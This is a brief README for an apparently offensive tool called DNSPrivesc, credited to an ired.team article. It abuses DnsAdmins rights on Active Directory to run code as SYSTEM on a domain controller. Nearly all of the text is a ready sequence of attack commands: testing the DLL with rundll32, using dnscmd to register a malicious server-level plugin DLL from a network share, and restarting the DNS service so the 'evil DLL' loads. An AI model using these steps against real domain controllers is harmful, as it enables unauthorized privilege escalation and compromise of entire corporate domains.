# DNSPrivesc
Shamelessly copied from:
[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise) - Go read it for more detailed explanation

## Using the DLL

Build and test
```
rundll32.exe .\DNSPrivesc.dll,DnsPluginInitialize
```
Upload evil plugin dll
```
dnscmd dc01.corp.local /config /serverlevelplugindll \\fileshare\dnsprivesc.dll
```
Restart DNS service to apply the evil DLL
```
sc stop dns
sc start dns
```
